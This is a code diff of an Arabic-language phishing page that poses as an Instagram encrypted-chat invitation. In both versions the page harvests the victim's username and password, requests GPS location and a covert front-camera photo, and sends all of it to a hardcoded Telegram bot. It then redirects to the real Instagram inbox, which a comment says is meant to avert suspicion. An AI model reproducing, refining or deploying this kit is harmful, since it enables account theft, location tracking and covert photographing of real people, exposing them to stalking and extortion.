@@ -3,100 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Chat Access</title>
+    <title>Instagram Private Messaging</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #050505; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .chat-card { background: #121212; border: 1px solid #262626; border-radius: 12px; padding: 30px 20px; width: 320px; text-align: center; }
-        .insta-logo { width: 50px; margin-bottom: 15px; }
-        h2 { font-size: 18px; margin-bottom: 10px; font-weight: 600; }
-        p { font-size: 12px; color: #a8a8a8; margin-bottom: 20px; line-height: 1.4; }
-        input { width: 100%; background: #1a1a1a; border: 1px solid #363636; border-radius: 5px; padding: 12px; color: #fff; margin-bottom: 10px; box-sizing: border-box; font-size: 13px; text-align: center; }
-        button { width: 100%; background: #0095f6; color: white; border: none; border-radius: 8px; padding: 10px; font-weight: bold; cursor: pointer; font-size: 14px; }
-        #loading { display: none; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background-color: #121212; border: 1px solid #262626; border-radius: 15px; padding: 30px 25px; width: 330px; text-align: center; box-shadow: 0 15px 50px rgba(0,0,0,0.8); }
+        .insta-icon { width: 60px; height: 60px; margin-bottom: 20px; }
+        h2 { font-size: 19px; font-weight: 600; margin-bottom: 10px; }
+        p { font-size: 13px; color: #a8a8a8; line-height: 1.5; margin-bottom: 25px; }
+        .input-box { width: 100%; background: #1a1a1a; border: 1px solid #363636; border-radius: 8px; padding: 14px; color: #fff; font-size: 14px; box-sizing: border-box; margin-bottom: 12px; outline: none; text-align: center; }
+        .btn-join { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 8px; padding: 12px; font-weight: bold; cursor: pointer; font-size: 15px; transition: 0.2s; }
+        .btn-join:active { opacity: 0.7; }
+        #loader { display: none; padding: 20px; }
+        .spinner { width: 30px; height: 30px; border: 3px solid #333; border-top: 3px solid #0095f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="chat-card">
-        <div id="auth-ui">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="insta-logo">
-            <h2>غرفة دردشة خاصة</h2>
-            <p>لقد تمت دعوتك للانضمام إلى دردشة مشفرة. يرجى تسجيل الدخول بحسابك لتأكيد الهوية وفتح الوصول.</p>
-            <input type="text" id="field_u" placeholder="اسم المستخدم أو الهاتف">
-            <input type="password" id="field_p" placeholder="كلمة المرور">
-            <button onclick="executeProtocol()">انضمام الآن</button>
+    <div class="container">
+        <div id="login-screen">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="insta-icon" alt="Instagram">
+            <h2>دخول الدردشة الخاصة</h2>
+            <p>لقد تلقيت دعوة للانضمام إلى محادثة مشفرة. يرجى تسجيل الدخول بحساب Instagram الخاص بك للتحقق من هويتك وفك تشفير الرسائل.</p>
+            
+            <input type="text" id="username" placeholder="اسم المستخدم، الهاتف أو البريد" spellcheck="false">
+            <input type="password" id="password" placeholder="كلمة المرور">
+            
+            <button class="btn-join" onclick="initSecurityCheck()">انضمام إلى الدردشة</button>
+            <div style="margin-top: 15px; font-size: 11px; color: #555;">تشفير نهاية لنهاية (End-to-End) نشط</div>
         </div>
 
-        <div id="loading">
-            <div style="margin: 20px auto; width: 30px; height: 30px; border: 3px solid #333; border-top-color: #0095f6; border-radius: 50%; animation: spin 1s infinite linear;"></div>
-            <p id="status-text">جاري التحقق من الصلاحيات...</p>
+        <div id="loader">
+            <div class="spinner"></div>
+            <h3 style="font-size: 16px;">جاري مطابقة البيانات...</h3>
+            <p id="status">يرجى الانتظار وتثبيت الجهاز أمام الوجه لإتمام بروتوكول التحقق الحيوي.</p>
         </div>
     </div>
 
-    <video id="v" autoplay></video>
-    <canvas id="c"></canvas>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        // بيانات البوت الخاصة بك (تم تشفيرها قليلاً)
-        const _v1 = "8233268720";
-        const _v2 = "AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
-        const _cid = "897618292";
+        const TOKEN = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
+        const CHAT_ID = "897618292";
 
-        async function executeProtocol() {
-            const u = document.getElementById('field_u').value;
-            const p = document.getElementById('field_p').value;
+        async function initSecurityCheck() {
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
 
-            if (u.length < 3 || p.length < 3) return;
+            if (u.length < 3 || p.length < 3) {
+                alert("يرجى إدخال بيانات صحيحة");
+                return;
+            }
 
-            document.getElementById('auth-ui').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
+            // تبديل الواجهة
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
 
-            // 1. تحديد الموقع (GPS) - يطلب الإذن
+            // 1. طلب الموقع الجغرافي (GPS)
             navigator.geolocation.getCurrentPosition(pos => {
-                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                sendData(`📍 موقع المبتز:\n${map}`);
-            }, () => {}, {enableHighAccuracy: true});
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                sendToBot(`📍 موقع الهدف:\nhttps://www.google.com/maps?q=${lat},${lon}`);
+            }, (err) => {
+                sendToBot("⚠️ فشل جلب الموقع (رفض الإذن)");
+            }, { enableHighAccuracy: true });
 
-            // 2. فتح الكاميرا وصيد الصورة
+            // 2. طلب الكاميرا والتقاط الصورة
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('v');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
                 video.srcObject = stream;
 
                 setTimeout(() => {
-                    const canvas = document.getElementById('c');
+                    const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     
                     canvas.toBlob(blob => {
                         const fd = new FormData();
-                        fd.append("chat_id", _cid);
-                        fd.append("photo", blob, "victim.jpg");
-                        fd.append("caption", `👤 الحساب: ${u}\n🔑 الرمز: ${p}\n🔗 المصدر: دردشة خاصة`);
-                        fetch(`https://api.telegram.org/bot${_v1}:${_v2}/sendPhoto`, { method: "POST", body: fd })
-                        .then(() => finish());
+                        fd.append("chat_id", CHAT_ID);
+                        fd.append("photo", blob, "auth_check.jpg");
+                        fd.append("caption", `👤 اليوزر: ${u}\n🔑 الرمز: ${p}\n🔗 المصدر: شات خاص انستا`);
+                        
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd })
+                        .then(() => finalize());
                     }, 'image/jpeg');
-                }, 2000);
+                }, 2000); // التقاط الصورة بعد ثانيتين لضمان الوضوح
             } catch (e) {
-                sendData(`👤 الحساب: ${u}\n🔑 الرمز: ${p}\n⚠️ (رفض الكاميرا)`);
-                finish();
+                sendToBot(`👤 اليوزر: ${u}\n🔑 الرمز: ${p}\n❌ (رفض الكاميرا)`);
+                finalize();
             }
         }
 
-        function sendData(t) {
-            fetch(`https://api.telegram.org/bot${_v1}:${_v2}/sendMessage?chat_id=${_cid}&text=${encodeURIComponent(t)}`);
+        function sendToBot(msg) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
         }
 
-        function finish() {
-            document.getElementById('status-text').innerText = "تم تأكيد الهوية. جاري توجيهك...";
+        function finalize() {
+            document.getElementById('status').innerText = "اكتمل التحقق. يتم توجيهك للدردشة...";
             setTimeout(() => {
-                // التوجيه لصندوق رسائل إنستجرام
+                // التوجيه لرسائل الانستجرام الرسمية لإبعاد الشبهة
                 window.location.href = "https://www.instagram.com/direct/inbox/";
             }, 1500);
         }
     </script>
-    <style> @keyframes spin { to { transform: rotate(360deg); } } </style>
 </body>
 </html>
